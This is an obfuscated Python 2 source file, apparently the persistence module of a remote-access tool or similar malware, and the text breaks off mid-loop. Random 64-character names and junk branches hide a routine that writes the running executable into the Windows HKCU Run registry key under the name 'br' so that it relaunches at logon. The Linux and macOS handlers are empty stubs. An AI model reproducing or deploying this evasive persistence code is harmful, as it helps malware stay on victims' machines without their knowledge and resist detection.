# -*- coding: utf-8 -*-
import sys
zuIprBoNIyaYNVCoCudtKEmSKopUbqpwVwickxuIFltQnMGJdytajQeLvZznkWmL = 'SOMaJYuwFTDMGoICMzwpgriQdVmNElJyTXWHbVkdBBWgWisoMXSloVIYFNeFwwMW'
NYSfpkmfFVNANGAbmPJWPbOhEopFJcUYzPJUzRJudJfvTHawDZSUuetuIyrIYSsK = 'piDhgWQWlrOLPwieSYZcxqbcVDDAFigNozemwOEUTagigxZRaHfkGCyCUhupFZdy'
YdjfPTzeNaBaoHXSlTjyabGGPwVnceRtKQEfYGBJuVxHkmpMeEynpYmsClwssxwq = 'tKeMKZzBeyDCpdekyQEGkUKnpzAiqrsaiWCIIXtjyzeSXHAjTOojNmgIItKQrWNV'
if zuIprBoNIyaYNVCoCudtKEmSKopUbqpwVwickxuIFltQnMGJdytajQeLvZznkWmL == NYSfpkmfFVNANGAbmPJWPbOhEopFJcUYzPJUzRJudJfvTHawDZSUuetuIyrIYSsK:
    WNxmAPMMDkmUyJYDAaqQyjcgxFTmNvTKJmEfXkMgfpieKOuWGeLlHHUAovELaTUJ = 'KQuLVdMLtxCTuYWkSGpFzjLmeQeQJdOSVEuaWNBXzElqfvJBZgzdWaBLtGymbuxr'
    WNxmAPMMDkmUyJYDAaqQyjcgxFTmNvTKJmEfXkMgfpieKOuWGeLlHHUAovELaTUJ = zuIprBoNIyaYNVCoCudtKEmSKopUbqpwVwickxuIFltQnMGJdytajQeLvZznkWmL
else:
    WNxmAPMMDkmUyJYDAaqQyjcgxFTmNvTKJmEfXkMgfpieKOuWGeLlHHUAovELaTUJ = 'KQuLVdMLtxCTuYWkSGpFzjLmeQeQJdOSVEuaWNBXzElqfvJBZgzdWaBLtGymbuxr'
    WNxmAPMMDkmUyJYDAaqQyjcgxFTmNvTKJmEfXkMgfpieKOuWGeLlHHUAovELaTUJ = YdjfPTzeNaBaoHXSlTjyabGGPwVnceRtKQEfYGBJuVxHkmpMeEynpYmsClwssxwq
def GHnQfIqTfgaeSCZQGDMpiZcHSBdqMutFCpauGIrNKeVSBCjigTXWBnUpSYcPmleb():
    import _winreg
    sBhtYzfPdCxvcbvvUqkfvtrxrKsGxtfSeYqCeMPTgwVcVQClojOWsLiLkVycUWsq = 'RnvrbLIHFisLscWxLutFeOApOwyhnenApeEgkvPdRGaKfxUaWTHgPKVRONQtUXsr'
    GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU = 'aadQbIumAMFcLkbzCSsQyDIXnEovZEjSaPZpplkjMePBdFqCqiIzbyiUPqtcGpkr'
    VKnELXnMitYKaKtPxlFWUBiUnvjovYBtiBMMGglzwGpAHtdfGbHlGEvTHbEclrni = 'KkzDTzFlcGZbPedMHrtGgUevDJhqcDJriflaVQCDSdtJiOTIwqNyxSGZLGxrmCQo'
    oZOOLfggcDsufDJrfIlVovEpuEzaqObJcsxEjpsnhLgYQaGqgssRjtNdigbOnPsM = 'iubXhoSISWVHmmNebAozRWRwVpEBSpaGCFrILLIBlfDFcNhPjoZZFZFYMcZtelra'
    zrxeGLRPaUVWgCyMjmaCbqVQTLHCCGYfzxYnfvpQGcfpbRUEWKMZqDZGJnYPtGrH = 'iuXUBsSvYJZxjiUyNZJRKpYIoFKuLKFhpqeuhMqCvAqnkmahFtyTOHNHsYnlYbQu'
    if sBhtYzfPdCxvcbvvUqkfvtrxrKsGxtfSeYqCeMPTgwVcVQClojOWsLiLkVycUWsq in GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU:
        sBhtYzfPdCxvcbvvUqkfvtrxrKsGxtfSeYqCeMPTgwVcVQClojOWsLiLkVycUWsq = zrxeGLRPaUVWgCyMjmaCbqVQTLHCCGYfzxYnfvpQGcfpbRUEWKMZqDZGJnYPtGrH
        if GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU in VKnELXnMitYKaKtPxlFWUBiUnvjovYBtiBMMGglzwGpAHtdfGbHlGEvTHbEclrni:
            GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU = oZOOLfggcDsufDJrfIlVovEpuEzaqObJcsxEjpsnhLgYQaGqgssRjtNdigbOnPsM
    elif GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU in sBhtYzfPdCxvcbvvUqkfvtrxrKsGxtfSeYqCeMPTgwVcVQClojOWsLiLkVycUWsq:
        VKnELXnMitYKaKtPxlFWUBiUnvjovYBtiBMMGglzwGpAHtdfGbHlGEvTHbEclrni = GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU
        if VKnELXnMitYKaKtPxlFWUBiUnvjovYBtiBMMGglzwGpAHtdfGbHlGEvTHbEclrni in GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU:
            GRPosDMXvkquIDypCExuBQiqaZGFFusPUWyAOOYhJUBQqGdbrOodlYAgdOUWfcpU = zrxeGLRPaUVWgCyMjmaCbqVQTLHCCGYfzxYnfvpQGcfpbRUEWKMZqDZGJnYPtGrH
    from _winreg import HKEY_CURRENT_USER as HKCU
    zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu = 'GwHFjqjcenfEgBCngRijlwUiBcqWcoFNBbVBbhxqLMTlNcVABBeATspvSKuHoPwF'
    LRTbEpFnKqwiHiProhafRwRfoDJNHdBXBHcyKuVvATdgiQhEjcbLFKyWSrOdDrhb = 'wZESgfSMmBVOzvQoTWQJQQwCjhTpFGvVaWltmSTvqGUvJhJUJoapyFijIfVCkAkb'
    JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn = 'QyiFHZikUtGpaGnhjjmREsHKyOzRbRDvEPAVUmMMxsRHCRDTnWYbnVkzuRZuktHd'
    VvNfJxyjRJKDdcwuoFpJnQYqMxCPoHSeeGVkFWcwHyjzBoSdopoIlvkRHwdiaUZc = 'BQoKEeHPJvdCGeQkjdlxbqsacVjolhCcvXfaSwlfWoxzoMTYaUIKPegNnPYHccBT'
    sYIJBEeZRqOBhCvtRDjWoOaahemONvovxBXLvLWPdrVSHLhTqFRsMQGwXEmcrltw = 'iXmeuQjyGTHMzFGJUSnJXqecluilMNPJDkOATwDYbGLiGfcmIwbfqfUGCBFEqFRc'
    GKohmrMTasOixGetQgMRDOWSsgogrVEiCoqoMQMwlEaZuoQAaCgYlEHwqWxUYtgq = 'aSFnhVQXdgPezfnviBoLHFHIhKdyiiljnPnLValxBUMOfVmcfKjMohGTCslKpwUP'
    if zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu != VvNfJxyjRJKDdcwuoFpJnQYqMxCPoHSeeGVkFWcwHyjzBoSdopoIlvkRHwdiaUZc:
        LRTbEpFnKqwiHiProhafRwRfoDJNHdBXBHcyKuVvATdgiQhEjcbLFKyWSrOdDrhb = JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn
        for GKohmrMTasOixGetQgMRDOWSsgogrVEiCoqoMQMwlEaZuoQAaCgYlEHwqWxUYtgq in VvNfJxyjRJKDdcwuoFpJnQYqMxCPoHSeeGVkFWcwHyjzBoSdopoIlvkRHwdiaUZc:
            if GKohmrMTasOixGetQgMRDOWSsgogrVEiCoqoMQMwlEaZuoQAaCgYlEHwqWxUYtgq != JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn:
                LRTbEpFnKqwiHiProhafRwRfoDJNHdBXBHcyKuVvATdgiQhEjcbLFKyWSrOdDrhb = LRTbEpFnKqwiHiProhafRwRfoDJNHdBXBHcyKuVvATdgiQhEjcbLFKyWSrOdDrhb
            else:
                sYIJBEeZRqOBhCvtRDjWoOaahemONvovxBXLvLWPdrVSHLhTqFRsMQGwXEmcrltw = zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu
    else:
        JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn = zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu
        zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu = sYIJBEeZRqOBhCvtRDjWoOaahemONvovxBXLvLWPdrVSHLhTqFRsMQGwXEmcrltw
        if JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn == zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu:
            for GKohmrMTasOixGetQgMRDOWSsgogrVEiCoqoMQMwlEaZuoQAaCgYlEHwqWxUYtgq in zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu:
                if GKohmrMTasOixGetQgMRDOWSsgogrVEiCoqoMQMwlEaZuoQAaCgYlEHwqWxUYtgq == JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn:
                    JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn = zFznVcTgMjVbOkDMNTFbWWKlwAIWpTASIuqVNqEnvHIhDZksVJqnxnZXkSalPXPu
                else:
                    JpamWaFPAzNDhonakawJZGMNrbtvJGiIUOEhcuLamlnZxvlnxmFrbXOHxEHYrFKn = sYIJBEeZRqOBhCvtRDjWoOaahemONvovxBXLvLWPdrVSHLhTqFRsMQGwXEmcrltw
    QhiMPXKrefSVqevHjgELZhUYUUaopvciKOdDWUgcpMVHgsnMygrYrqVMgnXDtuvX = r'Software\Microsoft\Windows\CurrentVersion\Run'
    yFobHwpcYlRtGUKfNLCTykNXQrSRPifBsUTkDiPkJKLSdmqnZamzudxyZulGNhJM = 'KTJNNnKLSzcniIsXhhpxwdUcPNmePvMwzLnujTKeQeuuURMWLZiYBkNyiHStiqKa'
    EOsvgoUhzHhtDyiChOrKabtCtKexdAuPOAKPMEEgereZORjRKhgUWLlpjaeCXzvh = 'LNnSmvULgtUrwhxsMuDCGHXFlwdoyxAnblesCwkWrEJYCDdbBjeaZiYdFzjfVRuw'
    qLadxBHZXMgfwIFPVrDFJInrraHbJsGtAzpGCzfhANIlKPeUibGDdMXikMDyBwGh = 'PTnSDqbJPsoaQaMaSXiqOyMoYbDVejENEMYwFdHLPQIdnZzAnORTmMsCxcZXrgik'
    if yFobHwpcYlRtGUKfNLCTykNXQrSRPifBsUTkDiPkJKLSdmqnZamzudxyZulGNhJM == EOsvgoUhzHhtDyiChOrKabtCtKexdAuPOAKPMEEgereZORjRKhgUWLlpjaeCXzvh:
        tBDoByXQWLMlmanVRxWkYKuMDnBVwCJOSFflOTNQWjoADrMSYFXjyuOhpMKnKdSM = 'SjvrmsXarKfqhrrFwuQsiEnPNxNTLSQURLTAElqyQBuXTYcvqMwUqrKQEVzhACoH'
        tBDoByXQWLMlmanVRxWkYKuMDnBVwCJOSFflOTNQWjoADrMSYFXjyuOhpMKnKdSM = yFobHwpcYlRtGUKfNLCTykNXQrSRPifBsUTkDiPkJKLSdmqnZamzudxyZulGNhJM
    else:
        tBDoByXQWLMlmanVRxWkYKuMDnBVwCJOSFflOTNQWjoADrMSYFXjyuOhpMKnKdSM = 'SjvrmsXarKfqhrrFwuQsiEnPNxNTLSQURLTAElqyQBuXTYcvqMwUqrKQEVzhACoH'
        tBDoByXQWLMlmanVRxWkYKuMDnBVwCJOSFflOTNQWjoADrMSYFXjyuOhpMKnKdSM = qLadxBHZXMgfwIFPVrDFJInrraHbJsGtAzpGCzfhANIlKPeUibGDdMXikMDyBwGh
    ermlFPoqDOKptsyMvlbCFgbXMBuEqOBHxyMtsPZfJWZZapbANHkcbKAxvQjpESrn = sys.executable
    URsDgCZjTDBgCUjTUdjIKyUsIUDIMGgTFPAXdEanMOCsYzzIXBbNjkUsYkuwAusp = 'XlylHOfzfOACKPtitpMPrvBqXIZbVHGGUzWfGTnWvyBMRxdOqTcCpNkphYScOAJw'
    vazyQcUCnWUiVfvQVXEWrNJUcrRCwonuihLelmduHNFUNekbXXzyOBbnPmZAqxOf = 'qTINLqjaBFsXvrQRtMAijAjYKRuRIebpUqTPrnwPqCkLhopCvuUglxtHJqLutBHA'
    XKJwWfGQnQMSchgOwCKlUrNYSBoPaaYDlURqyQBHaKXWPPqKfovEAQmqYmutPnwT = 'ExYyDxEaDvSPXVhYeEnLFjmyPFWgguHFVCDAMzGmzQZuTzEggnhPMhwmWyKreDje'
    if URsDgCZjTDBgCUjTUdjIKyUsIUDIMGgTFPAXdEanMOCsYzzIXBbNjkUsYkuwAusp == vazyQcUCnWUiVfvQVXEWrNJUcrRCwonuihLelmduHNFUNekbXXzyOBbnPmZAqxOf:
        KyULymgluJvTQnjSHnKnWzEuJHAKWSLlEGTirzNWIxqUgOAMGSrTHESDAunzqVtP = 'AMxBfFrglcetVLzWnqJMHNGCzuabwXRxDRnajjyguZAaACdrokPUbhZJpfHkhhLl'
        KyULymgluJvTQnjSHnKnWzEuJHAKWSLlEGTirzNWIxqUgOAMGSrTHESDAunzqVtP = URsDgCZjTDBgCUjTUdjIKyUsIUDIMGgTFPAXdEanMOCsYzzIXBbNjkUsYkuwAusp
    else:
        KyULymgluJvTQnjSHnKnWzEuJHAKWSLlEGTirzNWIxqUgOAMGSrTHESDAunzqVtP = 'AMxBfFrglcetVLzWnqJMHNGCzuabwXRxDRnajjyguZAaACdrokPUbhZJpfHkhhLl'
        KyULymgluJvTQnjSHnKnWzEuJHAKWSLlEGTirzNWIxqUgOAMGSrTHESDAunzqVtP = XKJwWfGQnQMSchgOwCKlUrNYSBoPaaYDlURqyQBHaKXWPPqKfovEAQmqYmutPnwT
    try:
        ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB = 'zSLFlxdDGHhcrOgcyoVPnCPztgAyZSRfGRbRwhGcanrhAFpHRGkHjKUvyEHUiSlg'
        mgbAyVesvyxMEdHNpHYfddLnWRbYPVVLhpnKEwuRwLZhOxROertNBLXbVYzzPAdL = 'lqIdDqddXrQNgPEzxCwYEjmjQkXWBykJMeRjmlBTrBMqxbdHdhPyXdzaMpaKAwAl'
        iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT = 'QhmJjGWihARUYBrGlrSTDrTZKsFQmBghXesXZnVPchJFOReoNxvEmgzMRWqNBkIA'
        wSFBheoJcVKjGZLplBwgNQOfJUPiMgpFwyAUZuqllbIFRckmFEqdJLeaQSdpsZSA = 'hMVInOejjtDeKSmbIEcfXJTWSJuKFeEhIMYZythAXypsLHVXjYLnMPIKBHVDrsUU'
        tbKbYHCRDVghusNQUKnKxmpUvORjuVJIemcddRInxLuFmarKCDyqUiLiovwLzMiq = 'ZaGREWinFfeKSjkfFbgHMsoxsEIDPnpVawfFYANIBTaNtUHpsuWBxPhUzTTBcoxQ'
        uavRdhDNzpxGgUaWtznbmPGGhmEjbmRiFvNItpdfsrPRHDrsmXPbZiQSJXgGGorv = 'guSNwMPLypSqwCYZoEWlMFvHbXluwzDqylwUHqYIECPhIbgamklTdyjoJXGbIQve'
        if ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB != wSFBheoJcVKjGZLplBwgNQOfJUPiMgpFwyAUZuqllbIFRckmFEqdJLeaQSdpsZSA:
            mgbAyVesvyxMEdHNpHYfddLnWRbYPVVLhpnKEwuRwLZhOxROertNBLXbVYzzPAdL = iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT
            for uavRdhDNzpxGgUaWtznbmPGGhmEjbmRiFvNItpdfsrPRHDrsmXPbZiQSJXgGGorv in wSFBheoJcVKjGZLplBwgNQOfJUPiMgpFwyAUZuqllbIFRckmFEqdJLeaQSdpsZSA:
                if uavRdhDNzpxGgUaWtznbmPGGhmEjbmRiFvNItpdfsrPRHDrsmXPbZiQSJXgGGorv != iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT:
                    mgbAyVesvyxMEdHNpHYfddLnWRbYPVVLhpnKEwuRwLZhOxROertNBLXbVYzzPAdL = mgbAyVesvyxMEdHNpHYfddLnWRbYPVVLhpnKEwuRwLZhOxROertNBLXbVYzzPAdL
                else:
                    tbKbYHCRDVghusNQUKnKxmpUvORjuVJIemcddRInxLuFmarKCDyqUiLiovwLzMiq = ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB
        else:
            iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT = ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB
            ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB = tbKbYHCRDVghusNQUKnKxmpUvORjuVJIemcddRInxLuFmarKCDyqUiLiovwLzMiq
            if iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT == ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB:
                for uavRdhDNzpxGgUaWtznbmPGGhmEjbmRiFvNItpdfsrPRHDrsmXPbZiQSJXgGGorv in ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB:
                    if uavRdhDNzpxGgUaWtznbmPGGhmEjbmRiFvNItpdfsrPRHDrsmXPbZiQSJXgGGorv == iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT:
                        iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT = ipzKMHXJjuggelQHOILaeSvPsPGCrjXupETidXxbqsrkEwLWLmuQWpzmQwmqHEUB
                    else:
                        iJYpBfCbqRguOfLxkonkVumiALPPMYAfzqbnMyCaemdwVeFrlACRQKlWxisHbFUT = tbKbYHCRDVghusNQUKnKxmpUvORjuVJIemcddRInxLuFmarKCDyqUiLiovwLzMiq
        TGFsLafjFmLVEKviXnFTOrFyRHWerTVXnTDdIQJxamAIxXUcyExYcSQsLRRMJSVA = _winreg.OpenKey(HKCU, QhiMPXKrefSVqevHjgELZhUYUUaopvciKOdDWUgcpMVHgsnMygrYrqVMgnXDtuvX, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(TGFsLafjFmLVEKviXnFTOrFyRHWerTVXnTDdIQJxamAIxXUcyExYcSQsLRRMJSVA, 'br', 0, _winreg.REG_SZ, ermlFPoqDOKptsyMvlbCFgbXMBuEqOBHxyMtsPZfJWZZapbANHkcbKAxvQjpESrn)
        _winreg.CloseKey(TGFsLafjFmLVEKviXnFTOrFyRHWerTVXnTDdIQJxamAIxXUcyExYcSQsLRRMJSVA)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        lzkQZrLyFMGwNHGFaSUxRzILVjqxyofCFsxevHPhbXlQbcqAisbiQgElmEHRDqpI = 'dTZRrPTBkVKVoRPeOutKtWCenHxlWENhaetqcoshmNapfnJCxJWwMofiTqcHGszb'
        nEArToqdXiuMrZpDypHeUTpYNuOGVCFtkeLnrrHAUWPeOhDwdWDkMnQqmHuVdvlx = 'oYwfrnswQrMBOlfDEjTdrSSBsKvqUlrvZPiGtkQzaUGaCsHCRPtzQfaMWyeaGmDI'
        if lzkQZrLyFMGwNHGFaSUxRzILVjqxyofCFsxevHPhbXlQbcqAisbiQgElmEHRDqpI != nEArToqdXiuMrZpDypHeUTpYNuOGVCFtkeLnrrHAUWPeOhDwdWDkMnQqmHuVdvlx:
            rmahqCagvtZrhyUvvptRUwRLzSGfWJXqCUfnBIcYhUfKGzPINZjuRMSoKnUTIKWa = 'WCBpXkHlwSRdLyGzhkISAyJPrTWqLPDCmJZpdlIxCYltMNcEuSFXMbvmspdsMyjj'
            yOKfUjhEPyVuDwYFhIqECfkkVMcWkanaDNFtTVfpYhVyJdMsipONSAuKxXhwjITt = 'yuyUUGCtlFzXSGjtrRGYXbfiFxLNgCAZqdVKmpLmUFxHYZfzwPrUxsjCCLuptude'
            yOKfUjhEPyVuDwYFhIqECfkkVMcWkanaDNFtTVfpYhVyJdMsipONSAuKxXhwjITt = rmahqCagvtZrhyUvvptRUwRLzSGfWJXqCUfnBIcYhUfKGzPINZjuRMSoKnUTIKWa
        return False, 'HKCU Run registry key failed'
def ZdWCsVasCCkDBDjSVeDhIqVsxVGRBLoruXyMkJXxviZOTChxYQvbAnmbhNktRkTO():
    return False, 'nothing here yet'
def TisLpOxQhwkNIIlNUZMJSAyvZKWASELaGNGZEKNqRpcVAWeOnIYZrmwmHMbPLMKc():
    return False, 'nothing here yet'
def MLHlzBrlHlRHgwQrfyWjACciGuFXCTKNwPUFwdxLvtefBBDIaFXJNJlgiRrJVSjP(plat_type):
    if plat_type.startswith('win'):
        OjWsKsgRUbOmXyTzxeDXLHFzoZcuKXwRuLqAjBdQUrlpoPzDrzPQiBqTJlUxQRID = 'NOsCEtnQFmNemlyfUTeUWwDzXZcjFRbNplFqsSUwIJDVevxUjpSDAEKHPqqfXdDF'
        YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp = 'wNhGSOOCyFUNpxUiZytXmkECDMOdeSwNAooCUSCHuSxcXegCgUJmxjtafCkSuoMF'
        TPWYDSjthfZqWXoPHtWZaVfdknGQoszYDoJjihRhnYdukDutbRDYxDrwdHsrFYDh = 'jXMLUSUqZqaIJnHqELDwjcCMQdlgaSdgnabruulQUqwjpGtpWQeqNpanJNJnfJSF'
        LYSZxwBnOvbrdRLWaoDhJGnVfckDmmsimMPzJSLXOLwFaZClmGcCSVFIVIVSoqDo = 'maJzygpsvQLBoCunocFlxlqzCQRwYbNTWdFxFgRAorsssxBjjorwqzwQLvwGTrJp'
        bTXdFaNBqOHISNXHallFCOuHsdqAGHDzxJGRhdKxbCoxmAbnfBRUJrEMOzvNotsz = 'TKPnlxtRJyNteMjVagUamJdGKfBgAAnsjHDMVYKijmEpePbfIVyEMVvXHaVoWkgG'
        if OjWsKsgRUbOmXyTzxeDXLHFzoZcuKXwRuLqAjBdQUrlpoPzDrzPQiBqTJlUxQRID in YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp:
            OjWsKsgRUbOmXyTzxeDXLHFzoZcuKXwRuLqAjBdQUrlpoPzDrzPQiBqTJlUxQRID = bTXdFaNBqOHISNXHallFCOuHsdqAGHDzxJGRhdKxbCoxmAbnfBRUJrEMOzvNotsz
            if YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp in TPWYDSjthfZqWXoPHtWZaVfdknGQoszYDoJjihRhnYdukDutbRDYxDrwdHsrFYDh:
                YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp = LYSZxwBnOvbrdRLWaoDhJGnVfckDmmsimMPzJSLXOLwFaZClmGcCSVFIVIVSoqDo
        elif YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp in OjWsKsgRUbOmXyTzxeDXLHFzoZcuKXwRuLqAjBdQUrlpoPzDrzPQiBqTJlUxQRID:
            TPWYDSjthfZqWXoPHtWZaVfdknGQoszYDoJjihRhnYdukDutbRDYxDrwdHsrFYDh = YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp
            if TPWYDSjthfZqWXoPHtWZaVfdknGQoszYDoJjihRhnYdukDutbRDYxDrwdHsrFYDh in YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp:
                YJeGBDXeHmldWtWsbeZnLbjuFLFOmvxsPokKofRmNrLbKRymariogeWRTNwVsemp = bTXdFaNBqOHISNXHallFCOuHsdqAGHDzxJGRhdKxbCoxmAbnfBRUJrEMOzvNotsz
        success, mymKsXxasSbzfVMCGuceyVVZuSdrHMZRzNeBdFblbaqelLHcCTAKueiCejgoYNxY = GHnQfIqTfgaeSCZQGDMpiZcHSBdqMutFCpauGIrNKeVSBCjigTXWBnUpSYcPmleb()
    elif plat_type.startswith('linux'):
        BlNzgRRiQzsEcGIrMhBONaCcLkPVLcRDEBiEZfNHbyTnGMygpIyfQxAEDPRtqSDH = 'ilEqYVTuntFqeQypLlkogcsAcQJMlmCwikycBcvsZzRnPFYxWpIuTuXfGeAgHdRp'
        qYlGDFNZNilUnVgwyLCRQWSouYvPrGaoXeDNpsLpFTBwSebUahifMTDFhKoOsFSY = 'DfgTRFGqVtOzbsRCFSTaNwpESuZsufZOGQMNiyyYJgmumosnDkDgywASWGJUDKBh'
        OExTsMfESvLGMDmVYmFdrQmxLRQXRUtfoYXeeTqOmAeXEEDymDIrOlYWZOooPxvp = 'QBWiUbRcrCkYiQOkEwAKZvZcVHlkOydFgICjcSSFLDVdvNILSUgxVXLnxuLgLDJA'
        if BlNzgRRiQzsEcGIrMhBONaCcLkPVLcRDEBiEZfNHbyTnGMygpIyfQxAEDPRtqSDH == qYlGDFNZNilUnVgwyLCRQWSouYvPrGaoXeDNpsLpFTBwSebUahifMTDFhKoOsFSY:
            MUsPfWBKKZsQyssHRUSLiPelrkPZrJYRfsHNThikYbKfdJiVahlRqGPCVJnEsJmK = 'RgqaRkYbEJgeRDxDWJDrNwSaMFoJFKWALWxCsQmWRMnOyoBQxabicmePgLYBNaSM'
            MUsPfWBKKZsQyssHRUSLiPelrkPZrJYRfsHNThikYbKfdJiVahlRqGPCVJnEsJmK = BlNzgRRiQzsEcGIrMhBONaCcLkPVLcRDEBiEZfNHbyTnGMygpIyfQxAEDPRtqSDH
        else:
            MUsPfWBKKZsQyssHRUSLiPelrkPZrJYRfsHNThikYbKfdJiVahlRqGPCVJnEsJmK = 'RgqaRkYbEJgeRDxDWJDrNwSaMFoJFKWALWxCsQmWRMnOyoBQxabicmePgLYBNaSM'
            MUsPfWBKKZsQyssHRUSLiPelrkPZrJYRfsHNThikYbKfdJiVahlRqGPCVJnEsJmK = OExTsMfESvLGMDmVYmFdrQmxLRQXRUtfoYXeeTqOmAeXEEDymDIrOlYWZOooPxvp
        success, mymKsXxasSbzfVMCGuceyVVZuSdrHMZRzNeBdFblbaqelLHcCTAKueiCejgoYNxY = ZdWCsVasCCkDBDjSVeDhIqVsxVGRBLoruXyMkJXxviZOTChxYQvbAnmbhNktRkTO()
    elif plat_type.startswith('darwin'):
        eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE = 'LFwuDhXWUHemjNVaeEIhzrvZaYClxmfrSSvGcxoeaMKCxBSjODnlOwdcwghJLKsB'
        IwcRQuzNgHcNhhZNVUqMEWKJGTlWcTywVNvsUVoUnfKBOftnVPnWYdeQggAuGoMT = 'mnqomIwCrjdwzjyMvhPqWlvQNvlLVIVdWHhdiDKssQayHSsKCjepoQEVWULkNGUk'
        QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA = 'GhiFFKmlomoZZiUvsNoCAesymYDLXHjuKmYPabNUmPyMEswjVGVLHZAbiKUfNYWH'
        FqdemiHTkOMoxVUkWEcWNEfWooGbCERfxyvwQWHUjHXvLEkTMGJQCAXUTPwIvPSz = 'BwgbpaphgvmBjkppydDvzNBExCahDHYZkzGLWrIBlwvPvTJEVaWANvlDobwVAJKz'
        cIeHeyjGewrTVdwkGYbhvAwgprRAqrpVpMDQROsHyRYVIaurSgUodwwOXlgBVydq = 'HgflkZcqusdOFfvEHlBumLHWKgHDMPOlZggJOUkQUTnXTYyPpnPeiRBnZpgglyzy'
        LApAAQfWosXHiRWTgcJdnvCtmWkyYZUbSYboVHEGwpyvtAWdtPHUIODQJJsadKRR = 'RomtmJjVewYNGHdeQuBTHCEoJjBwEfwxKlWXfwVMvpOPWNTXxMlhHewGoyNjCCPV'
        if eapRSbEAUYaxUJnEPxXwwoxZfAMzCtruARJuhldHVGnEgIgzYPuOFjKzYjgraKCE != FqdemiHTkOMoxVUkWEcWNEfWooGbCERfxyvwQWHUjHXvLEkTMGJQCAXUTPwIvPSz:
            IwcRQuzNgHcNhhZNVUqMEWKJGTlWcTywVNvsUVoUnfKBOftnVPnWYdeQggAuGoMT = QpKElLCPlJcNhytHCflSrKrVrUxurCbPptQtOoBhtwgJjYOyuutqsIOnpuKYZBFA
            for LApAAQfWosXHiRWTgcJdnvCtmWkyYZUbSYboVHEGwpyvtAWdtPHUIODQJJsadKRR in FqdemiHTkOMoxVUkWEcWNEfWooGbCERfxyvwQWHUjHXvLEkTMGJQCAXUTPwIvPSz:
